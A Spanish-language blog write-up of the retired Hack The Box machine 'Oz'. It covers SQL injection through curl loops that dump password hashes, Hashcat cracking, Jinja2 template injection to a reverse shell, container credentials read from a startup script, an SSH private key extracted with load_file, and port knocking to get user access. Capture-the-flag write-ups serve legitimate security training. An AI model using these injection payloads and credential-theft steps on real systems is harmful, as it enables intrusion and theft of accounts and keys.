<!DOCTYPE html>
<html lang="es"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Maquina Retirada Oz de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Maquina Retirada Oz de Hack The Box (Necesario VIP)" />
<meta name="author" content="Pirrandi" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada OZ" />
<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada OZ" />
<link rel="canonical" href="http://localhost:4000/2021/06/20/Oz~HackTheBox.html" />
<meta property="og:url" content="http://localhost:4000/2021/06/20/Oz~HackTheBox.html" />
<meta property="og:site_name" content="Pirrandi Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-06-20T00:00:00-03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Maquina Retirada Oz de Hack The Box (Necesario VIP)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2021-06-20T00:00:00-03:00","datePublished":"2021-06-20T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada OZ","headline":"Maquina Retirada Oz de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/06/20/Oz~HackTheBox.html"},"url":"http://localhost:4000/2021/06/20/Oz~HackTheBox.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="" class="author-avatar" alt="Avatar" />
    
Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.

</div>


<div class="post">
  <h1 class="post-title">Maquina  Retirada Oz de Hack The Box (Necesario VIP)</h1>
  
  <div class="post-tags">
     
      <a class="tag" href="/tag/HTB,/">HTB,</a>
      
      <a class="tag" href="/tag/SQLI,/">SQLI,</a>
      
      <a class="tag" href="/tag/SSTI(Server/">SSTI(Server</a>
      
      <a class="tag" href="/tag/Side/">Side</a>
      
      <a class="tag" href="/tag/Template/">Template</a>
      
      <a class="tag" href="/tag/Injection),/">Injection),</a>
      
      <a class="tag" href="/tag/Port/">Port</a>
      
      <a class="tag" href="/tag/Knocking,/">Knocking,</a>
      
      <a class="tag" href="/tag/Portainer,/">Portainer,</a>
      
      <a class="tag" href="/tag/Dockers,/">Dockers,</a>
      
      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
      
      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
      
      <a class="tag" href="/tag/Writeup/">Writeup</a>
      
  </div>
  
  <div class="post-date">Published on 20 Jun 2021</div>
  
  <noscript>
    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada OZ</div>
  </noscript>
  <div id="animated-post-description" class="post-description" style="display: none;"></div>
  
  <h1 id="oz--hack-the-box">OZ ~ Hack The Box</h1>

<p>Realizamos el Primer escaneo con Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.96       "</span>
</code></pre></div></div>
<p>Procedemos con el siguiente escaneo de Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 <span class="o">(</span>Python 2.7.14<span class="o">)</span>
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 <span class="o">(</span>Python 2.7.14<span class="o">)</span>
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
</code></pre></div></div>
<p>Procedemos con la herramienta <code class="language-plaintext highlighter-rouge">Wfuzz</code> a enumerar rutas y directorios</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># wfuzz -c --hc=404 -w /usr/share/wordlist/rockyou.txt http://10.10.10.96/FUZZ</span>
<span class="s2">"/users/"</span>
</code></pre></div></div>
<p>Probamos a seguir enumerando con la herramienta <code class="language-plaintext highlighter-rouge">Wfuzz</code> por la ruta <code class="language-plaintext highlighter-rouge">/users/FUZZ</code> y nos da un fallo de <code class="language-plaintext highlighter-rouge">Internal Server Error</code> cuando llega a la <code class="language-plaintext highlighter-rouge">'</code>
Sera vulnerable a una <code class="language-plaintext highlighter-rouge">Injeccion SQL</code>?</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Probamos a hacer un <span class="s2">"' order by 1-- -"</span> y nos responde un <span class="s2">"NULL"</span>
</code></pre></div></div>
<p>Con esto verificamos que es vulnerable a SQLI y procedemos a realizar las siguientes consultas SQLI:</p>
<pre><code class="language-mysql">Consulta 1:
"' union select database()-- -"
10.10.10.96/users/'%20union%20select%20database()--%20-			  RESPUESTA DEL SERVIDOR:	‚Äúozdb‚Äù Base de Datos en USO

Consulta 2:
"' union select user()-- -"
10.10.10.96/users/'%20union%20select%20user()--%20-						RESPUESTA DEL SERVIDOR: "dorthi@10.100.10.6"   un contenedor ?? de donde es esta IP ¬ø¬ø??

Consulta 3:
usamos Curl para hacer las peticiones: 
"' union select schema_name from information_schema.shemata limit 0,1-- -" e iteramos sobre el valor de 0 con un bucle para $i y sacar todas los nombres de las bases de datos
# for i in $(seq 0 5); do curl -s -X GET "http://10.10.10.96/users/'%20union%20select%20schema_name%20from%20information_schema.schemata%20limit%20$i,%201--%20-"  | jq ; done | tr '{}' ' '  
 
  "username": "information_schema"
  "username": "mysql"
  "username": "ozdb"
  "username": "performance_schema"

Consulta 4:
Vamos a averiguar las tablas de una de las bases de datos encontradas anteriormente:
"' union select table_name from information_schema.tables where table_schema="osdb" limit 0,1-- -" 
# for i in $(seq 0 10); do curl -s -X GET "http://10.10.10.96/users/'%20union%20select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22ozdb%22%20limit%20$i,%201--%20-"  | jq ; done | tr '{}' ' '  
 
  "username": "tickets_gbw"
  "username": "users_gbw"
   null

Consulta 5:
Vamos a averiguar las columnas de la tabla en la base de datos que ya hemos encontrado: Usamos Curl: Iteramos sobre un FOR
"' union select column_name from information_schema.columns where table_schema="ozdb" and table_name="users_gbw" limit 0,1-- -"
# for i in $(seq 0 5); do curl -s -X GET "http://10.10.10.96/users/'%20union%20select%20column_name%20from%20information_schema.columns%20where%20table_schema=%22ozdb%22%20and%20table_name=%22users_gbw%22%20limit%20$i,%201--%20-"  | jq ; done | tr '{}' ' '  
 
  "username": "id"
  "username": "username"
  "username": "password"
</code></pre>
<p>Ya tenemos los Campos <code class="language-plaintext highlighter-rouge">Username &amp; Password</code> que son en los que queremos visualizar la <code class="language-plaintext highlighter-rouge">DATA</code> dentro de ellos.
Como <code class="language-plaintext highlighter-rouge">Solo Tenemos una columna</code> necesitamos jugar con un <code class="language-plaintext highlighter-rouge">GROUP_CONCAT(username, password)</code> para poder listar dos campos en una sola columna.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Consulta 6:
vamos a listar los campos Username, Password de la tabla <span class="s2">"users_gbw"</span> de la base de datos <span class="s2">"ozdb"</span>
<span class="s2">"' union select group_concat(username,':',password) from users_gbw-- -"</span>
<span class="c"># curl -s -X GET "http://10.10.10.96/users/'%20union%20select%20group_concat(username,%22:%22,password)%20from%20users_gbw--%20-"  | tr ',' '\n'                     </span>

username<span class="s2">":"</span>dorthi:<span class="nv">$pbkdf2</span><span class="nt">-sha256</span><span class="nv">$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU</span>/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78
tin.man:<span class="nv">$pbkdf2</span><span class="nt">-sha256</span><span class="nv">$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw</span>.W.ZWMyHYAJ5mpvWialENXofk
wizard.oz:<span class="nv">$pbkdf2</span><span class="nt">-sha256</span><span class="nv">$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti</span>/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY
coward.lyon:<span class="nv">$pbkdf2</span><span class="nt">-sha256</span><span class="nv">$5000$bU2JsVYqpbT2PqcUQmjN</span>.Q<span class="nv">$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO</span>/tbBuw4DY
toto:<span class="nv">$pbkdf2</span><span class="nt">-sha256</span><span class="nv">$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg</span>
admin:<span class="nv">$pbkdf2</span><span class="nt">-sha256</span><span class="nv">$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK</span>.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ
</code></pre></div></div>
<p>Encontramos unos hashes, estos hashes pueden ser <code class="language-plaintext highlighter-rouge">crackeados</code> y averiguamos el tipo de hash que es para luego mediante el uso de la herramienta <code class="language-plaintext highlighter-rouge">Hashcat</code></p>

<ul>
  <li>TIPO DE HASH - Identificado en hashcat examples hashes wiki 
<code class="language-plaintext highlighter-rouge">| PBKDF2-HMAC-SHA256 | sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt |</code></li>
</ul>

<p>Adecuamos nuestros hashes a este hash para que <code class="language-plaintext highlighter-rouge">Hashcat</code> lo pille correctamente y nos haga su trabajo de Fuerza Fruta</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄpro<span class="o">)</span>-[/home/‚Ä¶/Escritorio/HTB/Oz/nmap]
‚îî‚îÄ# <span class="nb">cat hash                                                             
</span>sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY
</code></pre></div></div>
<p>Procedemos con Hashcat a intentar crackear primero el hash del usuario ‚ÄúWizard.oz‚Äù</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># hashcat -m 10900 hash dicc</span>
hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...

<span class="o">=============================================================================================================================</span>
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
<span class="k">*</span> Zero-Byte
<span class="k">*</span> Single-Hash
<span class="k">*</span> Single-Salt
<span class="k">*</span> Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required <span class="k">for </span>this attack: 66 MB

Dictionary cache built:
<span class="k">*</span> Filename..: dicc
<span class="k">*</span> Passwords.: 31601
<span class="k">*</span> Bytes.....: 317299
<span class="k">*</span> Keyspace..: 31601
<span class="k">*</span> Runtime...: 0 secs

<span class="s2">"sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY"</span>: <span class="s2">"wizardofoz22"</span>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: PBKDF2-HMAC-SHA256
Hash.Target......: sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7...Qq6LWY
Time.Started.....: Sun Jun 20 12:52:27 2021 <span class="o">(</span>0 secs<span class="o">)</span>
Time.Estimated...: Sun Jun 20 12:52:27 2021 <span class="o">(</span>0 secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>dicc<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:    15871 H/s <span class="o">(</span>11.21ms<span class="o">)</span> @ Accel:512 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests
Progress.........: 4096/31601 <span class="o">(</span>12.96%<span class="o">)</span>
Rejected.........: 0/4096 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 0/31601 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-4999
Candidates.#1....: mendoza -&gt; zozokey

Started: Sun Jun 20 12:52:09 2021
Stopped: Sun Jun 20 12:52:29 2021
</code></pre></div></div>
<p>Ya tenemos unas Credenciales como el user <code class="language-plaintext highlighter-rouge">wizard.oz : wizardofoz22</code>
Vamos a hechar un ojo al puerto 8080 y vemos que tenemos un panel loguin
Procedemos con las credenciales obtenidas. Nos logueamos correctamente
<strong>foto</strong></p>

<p>Vemos que podemos crear etiquetas o comentarios. Vemos tambien que el <code class="language-plaintext highlighter-rouge">Wapallizer</code> nos reporta que estamos ante un <code class="language-plaintext highlighter-rouge">Flask</code></p>

<h1 id="server-side-template-injection-ssti">Server Side Template Injection (SSTI)</h1>
<p>Cuando tenemos una aplicacion como <code class="language-plaintext highlighter-rouge">FLASK</code> corriendo es posible que se pueda injectar codigo de la siguiente forma `` si al enviar este codigo la respuesta del lado del servidor vemos que cambia a <code class="language-plaintext highlighter-rouge">4</code> indica que puede ser <code class="language-plaintext highlighter-rouge">vulnerable a SSTI</code></p>

<p>Sacamos el <code class="language-plaintext highlighter-rouge">Burpsuite</code> he interceptamos la peticion de crear una etiqueta nueva!! 
Vamos a hacer uso de esta pagina https://github.com/swisskyrepo/PayloadsAllTheThings
En la parte de SSTI vemos varios recursos entre ellos <code class="language-plaintext highlighter-rouge">Jinja2 - Read remote file</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
</code></pre></div></div>
<p>y recibimos correctamente el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>
Tambien vemos que hay un recurso para un RCE <code class="language-plaintext highlighter-rouge">Jinja2 - Remote Code Execution</code>
<code class="language-plaintext highlighter-rouge">Exploit the SSTI by calling Popen without guessing the offset</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
</code></pre></div></div>
<p>Se ve que el simbolo &amp; no le gustaba y lo url encodeamos y listo. Nos ponemos en una session de <code class="language-plaintext highlighter-rouge">nc -vlnp 443</code> y esperamos a recibir la conexion al tramitar desde el Repiter la pwticion Web con el RCE.</p>

<p>Una vez dentro, vemos que no tenemos una bash asique tiramos de <code class="language-plaintext highlighter-rouge">rlwrap para simular la tty</code></p>

<p>Enumeramos el sistema ya que vemos que entramos como root en la ip <code class="language-plaintext highlighter-rouge">10.100.10.2</code> no en la de la maquina <code class="language-plaintext highlighter-rouge">10.10.10.96</code></p>

<p>Encontramos una contrase√±a para el user <code class="language-plaintext highlighter-rouge">root</code> en la ruta <code class="language-plaintext highlighter-rouge">/app/</code>archivo<code class="language-plaintext highlighter-rouge">start.sh</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dentro de la ip 10.100.10.2 atraves de 8080 gracias al SSTI 
<span class="nb">cat </span>start.sh
<span class="c">#!/bin/bash</span>

docker run <span class="nt">-d</span> <span class="nt">-v</span> /connect/mysql:/var/lib/mysql <span class="nt">--name</span> ozdb <span class="se">\</span>
<span class="nt">--net</span> prodnet <span class="nt">--ip</span> 10.100.10.4 <span class="se">\</span>
<span class="nt">-e</span> <span class="nv">MYSQL_ROOT_PASSWORD</span><span class="o">=</span>SuP3rS3cr3tP@ss <span class="se">\</span>
<span class="nt">-e</span> <span class="nv">MYSQL_USER</span><span class="o">=</span>dorthi <span class="se">\</span>
<span class="nt">-e</span> <span class="nv">MYSQL_PASSWORD</span><span class="o">=</span>N0Pl4c3L1keH0me <span class="se">\</span>
<span class="nt">-e</span> <span class="nv">MYSQL_DATABASE</span><span class="o">=</span>ozdb <span class="se">\</span>
<span class="nt">-v</span> /connect/sshkeys:/home/dorthi/.ssh/:ro <span class="se">\</span>
<span class="nt">-v</span> /dev/null:/root/.bash_history:ro <span class="se">\</span>
<span class="nt">-v</span> /dev/null:/root/.ash_history:ro <span class="se">\</span>
<span class="nt">-v</span> /dev/null:/root/.sh_history:ro <span class="se">\</span>
<span class="nt">--restart</span><span class="o">=</span>always <span class="se">\</span>
mariadb:5.5
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql_root <span class="o">=</span> SuP3rS3cr3tP@ss
</code></pre></div></div>

<p>Contrase√±a encontrada en <code class="language-plaintext highlighter-rouge">directorio TiCKETERS / archivo: database.pyc</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dorthi : N0Pl4c3L1keH0me   Ip:  10.100.10.4   MYSQL ?¬ø
</code></pre></div></div>
<p>Nos montamos una peque√±o <code class="language-plaintext highlighter-rouge">oneliner</code> para averiguar atraves de <code class="language-plaintext highlighter-rouge">nc -vnz</code>  para comprobar conexiones abiertas, y ver si el servicio de ‚ÄòMySQL‚Äô</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># for port in $(seq 1 10000);do nc -vnz 10.100.10.4 $port; done</span>
10.100.10.4 <span class="o">(</span>10.100.10.4:3306<span class="o">)</span> open
</code></pre></div></div>
<p>Vemos que el puerto <code class="language-plaintext highlighter-rouge">3306 MySQL</code> esta abierto en la maquina <code class="language-plaintext highlighter-rouge">10.100.10.4</code></p>

<p>Seguimos enumerando un poco el sistema <code class="language-plaintext highlighter-rouge">10.100.10.2</code> y vemos que en la raiz <code class="language-plaintext highlighter-rouge">/</code> tenemos:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ls -la
total 72
drwxr-xr-x   53 root     root          4096 May 15  2018 .
drwxr-xr-x   53 root     root          4096 May 15  2018 ..
-rwxr-xr-x    1 root     root             0 May 15  2018 .dockerenv
"drwxr-xr-x    2 root     root          4096 Apr 24  2018 .secret"   ---&gt; 
"drwxr-xr-x    5 root     root          4096 May 15  2018 app"
drwxr-xr-x    2 root     root          4096 Apr 27  2018 bin
"drwxr-xr-x    3 root     root          4096 May 15  2018 containers"
</code></pre></div></div>
<p>nos movemos al directorio <code class="language-plaintext highlighter-rouge">.secret</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#cd .secret</span>
<span class="c">#cat knockd.conf</span>
<span class="o">[</span>options]
        logfile <span class="o">=</span> /var/log/knockd.log

<span class="o">[</span>opencloseSSH]

        sequence        <span class="o">=</span> 40809:udp,50212:udp,46969:udp
        seq_timeout     <span class="o">=</span> 15
        start_command   <span class="o">=</span> ufw allow from %IP% to any port 22
        cmd_timeout     <span class="o">=</span> 10
        stop_command    <span class="o">=</span> ufw delete allow from %IP% to any port 22
        tcpflags        <span class="o">=</span> syn
/.secret <span class="c"># </span>
</code></pre></div></div>
<p>Vemos un archivo de configuracion llamado <code class="language-plaintext highlighter-rouge">"knockd.conf"</code> que nos recuerda al concepto de <code class="language-plaintext highlighter-rouge">PORT KNOCKING</code> asique seguimos enumerando el sistema con este concepto en mente ya que vemos que el archivo de configuracion nos indica que se abre el servicio ssh en la maquina victima al <code class="language-plaintext highlighter-rouge">golpear por UDP</code> los puertos indicados <code class="language-plaintext highlighter-rouge">40809 50212 46969</code></p>

<h1 id="port-knocking-concepto-nuevo">Port Knocking Concepto Nuevo</h1>

<p>Este archivo resulta que es para hacer PORT KNOCKING concepto nuevo</p>

<p>se supone que el Port Knocking es una secuecia de golpes por UDP para que un servicio que no esta abierto a internet se abra a traves de esta tecnica
que es lanzar un scaneo por udp con nmap a los puerto indicados de una IP objetivo</p>

<h1 id="mysql--mysqlshow">Mysql &amp; MysqlShow</h1>
<p>Vamos a probar autenticarnos al servicio de <code class="language-plaintext highlighter-rouge">Mysql</code> desde la ip <code class="language-plaintext highlighter-rouge">10.100.10.2</code> a la <code class="language-plaintext highlighter-rouge">10.100.10.4</code> por el puerto <code class="language-plaintext highlighter-rouge">3306</code>
Nos metemos al servicio de mysql de la 10.100.10.4 ya que el puerto 3306 esta open</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> mysqlshow <span class="nt">-h</span> 10.100.10.4 <span class="nt">-udorthi</span> <span class="nt">-pN0Pl4c3L1keH0me</span> mysql user
</code></pre></div></div>
<p>Usamos <code class="language-plaintext highlighter-rouge">mysqlshow</code> para listar toda la data</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-h</span> 10.100.10.4 <span class="nt">-udorthi</span> <span class="nt">-pN0Pl4c3L1keH0me</span> <span class="nt">-e</span> <span class="s1">'use mysql; select User,Password from user;'</span>
User    Password                                                                                                                                                                 root    		<span class="k">*</span>61A2BD98DAD2A09749B6FC77A9578609D32518DD                                                                                                                             dorthi  <span class="k">*</span>43AE542A63D9C43FF9D40D0280CFDA58F6C747CA                                                                                                                               
</code></pre></div></div>
<p>Como sabemos si estos hashes son lo que ya tenemos?De las dos contrase√±as encontradas?? pues podemos usar mysql para verificarlo de esta forma
si nosotros ya tenemos las contrase√±as en texto claro.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-h</span> 10.100.10.4 <span class="nt">-udorthi</span> <span class="nt">-pN0Pl4c3L1keH0me</span> <span class="nt">-e</span> <span class="s1">'use mysql; select password("N0Pl4c3L1keH0me") from user;'</span>
password<span class="o">(</span><span class="s2">"N0Pl4c3L1keH0me"</span><span class="o">)</span>
<span class="k">*</span>43AE542A63D9C43FF9D40D0280CFDA58F6C747CA                                                                                                                                       
</code></pre></div></div>
<p>vemos que si para dorthi</p>

<p>vemos que si para ROOT</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-h</span> 10.100.10.4 <span class="nt">-udorthi</span> <span class="nt">-pN0Pl4c3L1keH0me</span> <span class="nt">-e</span> <span class="s1">'use mysql; select password("SuP3rS3cr3tP@ss") from user;'</span>
password<span class="o">(</span><span class="s2">"SuP3rS3cr3tP@ss"</span><span class="o">)</span>
<span class="k">*</span>61A2BD98DAD2A09749B6FC77A9578609D32518DD
<span class="k">*</span>61A2BD98DAD2A09749B6FC77A9578609D32518DD
<span class="k">*</span>61A2BD98DAD2A09749B6FC77A9578609D32518DD
/containers/database <span class="c"># </span>
</code></pre></div></div>
<p>Desde aqui tambien podemos hacer otras cosas como listar archivos locales de la maquina victima,
y desde la injeccion en sql por fuera tambien prodriamos intentarlo. Lo probamos:
Desde el <code class="language-plaintext highlighter-rouge">SQLI</code> en el puerto 80 ip <code class="language-plaintext highlighter-rouge">10.10.10.96</code></p>

<p>Paso 1 - Pasamos a hex la ruta que queremos apuntar para que se la trague correctamente</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># echo "/home/dorthi/.shh/id_rsa" | xxd -ps                                                                                                                                      2f686f6d652f646f727468692f2e7368682f69645f727361</span>
<span class="nt">-----------------------------------</span> Apuntamos a la ruta con un load_file<span class="o">(</span>/ruta/<span class="o">)</span>
<span class="s2">"http://10.10.10.96/users/'%20union%20select%20load_file(0x2f686f6d652f646f727468692f2e7373682f69645f727361)--%20-"</span>
<span class="nt">-----------------------------------</span>
Tratamiento del archivo ssh id_rsa encontrado

<span class="c"># cat id_rsa | sed 's/\\n/\n/g'                                                                                                                                                                               </span>
        <span class="s2">"-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,66B9F39F33BA0788CD27207BF8F2D0F6

RV903H6V6lhKxl8dhocaEtL4Uzkyj1fqyVj3eySqkAFkkXms2H+4lfb35UZb3WFC
b6P7zYZDAnRLQjJEc/sQVXuwEzfWMa7pYF9Kv6ijIZmSDOMAPjaCjnjnX5kJMK3F
e1BrQdh0phWAhhUmbYvt2z8DD/OGKhxlC7oT/49I/ME+tm5eyLGbK69Ouxb5PBty
h9A+Tn70giENR/ExO8qY4WNQQMtiCM0tszes8+guOEKCckMivmR2qWHTCs+N7wbz
a//JhOG+GdqvEhJp15pQuj/3SC9O5xyLe2mqL1TUK3WrFpQyv8lXartH1vKTnybd
9+Wme/gVTfwSZWgMeGQjRXWe3KUsgGZNFK75wYtA/F/DB7QZFwfO2Lb0mL7Xyzx6
ZakulY4bFpBtXsuBJYPNy7wB5ZveRSB2f8dznu2mvarByMoCN/XgVVZujugNbEcj
evroLGNe/+ISkJWV443KyTcJ2iIRAa+BzHhrBx31kG//nix0vXoHzB8Vj3fqh+2M
EycVvDxLK8CIMzHc3cRVUMBeQ2X4GuLPGRKlUeSrmYz/sH75AR3zh6Zvlva15Yav
5vR48cdShFS3FC6aH6SQWVe9K3oHzYhwlfT+wVPfaeZrSlCH0hG1z9C1B9BxMLQr
DHejp9bbLppJ39pe1U+DBjzDo4s6rk+Ci/5dpieoeXrmGTqElDQi+KEU9g8CJpto
bYAGUxPFIpPrN2+1RBbxY6YVaop5eyqtnF4ZGpJCoCW2r8BRsCvuILvrO1O0gXF+
wtsktmylmHvHApoXrW/GThjdVkdD9U/6Rmvv3s/OhtlAp3Wqw6RI+KfCPGiCzh1V
0yfXH70CfLO2NcWtO/JUJvYH3M+rvDDHZSLqgW841ykzdrQXnR7s9Nj2EmoW72IH
znNPmB1LQtD45NH6OIG8+QWNAdQHcgZepwPz4/9pe2tEqu7Mg/cLUBsTYb4a6mft
icOX9OAOrcZ8RGcIdVWtzU4q2YKZex4lyzeC/k4TAbofZ0E4kUsaIbFV/7OMedMC
zCTJ6rlAl2d8e8dsSfF96QWevnD50yx+wbJ/izZonHmU/2ac4c8LPYq6Q9KLmlnu
vI9bLfOJh8DLFuqCVI8GzROjIdxdlzk9yp4LxcAnm1Ox9MEIqmOVwAd3bEmYckKw
w/EmArNIrnr54Q7a1PMdCsZcejCjnvmQFZ3ko5CoFCC+kUe1j92i081kOAhmXqV3
c6xgh8Vg2qOyzoZm5wRZZF2nTXnnCQ3OYR3NMsUBTVG2tlgfp1NgdwIyxTWn09V0
nOzqNtJ7OBt0/RewTsFgoNVrCQbQ8VvZFckvG8sV3U9bh9Zl28/2I3B472iQRo+5
uoRHpAgfOSOERtxuMpkrkU3IzSPsVS9c3LgKhiTS5wTbTw7O/vxxNOoLpoxO2Wzb
/4XnEBh6VgLrjThQcGKigkWJaKyBHOhEtuZqDv2MFSE6zdX/N+L/FRIv1oVR9VYv
QGpqEaGSUG+/TSdcANQdD3mv6EGYI+o4rZKEHJKUlCI+I48jHbvQCLWaR/bkjZJu
XtSuV0TJXto6abznSC1BFlACIqBmHdeaIXWqH+NlXOCGE8jQGM8s/fd/j5g1Adw3
-----END RSA PRIVATE KEY-----
</span></code></pre></div></div>
<p>Ahora que tenemos la <code class="language-plaintext highlighter-rouge">id_rsa</code> del usuario <code class="language-plaintext highlighter-rouge">dorthi</code> procedemos con el concepto del <code class="language-plaintext highlighter-rouge">Port Knocking</code>
Acordarse siempre tenemos que darle <code class="language-plaintext highlighter-rouge">permisos 600</code>  al <code class="language-plaintext highlighter-rouge">id_rsa</code>:
<code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/‚Ä¶/Escritorio/HTB/Oz/nmap]
‚îî‚îÄ# <span class="k">for </span>port <span class="k">in </span>40809 50212 46969<span class="p">;</span> <span class="k">do </span>nmap <span class="nt">-sU</span> <span class="nt">-Pn</span> <span class="nt">--max-retries</span> 0 <span class="nt">-p</span><span class="nv">$port</span> 10.10.10.96<span class="p">;</span> <span class="k">done</span> &amp;&gt; /dev/null<span class="p">;</span> ssh <span class="nt">-i</span> id_rsa dorthi@10.10.10.96                                     
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: <span class="o">[</span>Introducimos la credencial anteriormente encontrada]

dorthi@Oz:~<span class="nv">$ </span><span class="nb">ls
</span>user.txt
dorthi@Oz:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
c21cff3b0c26115143e6cea988dxxxxxx
dorthi@Oz:~<span class="nv">$ </span>
</code></pre></div></div>
<p>Conseguimos el <code class="language-plaintext highlighter-rouge">user.txt</code> vamos a por el <code class="language-plaintext highlighter-rouge">root.txt</code></p>

<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>

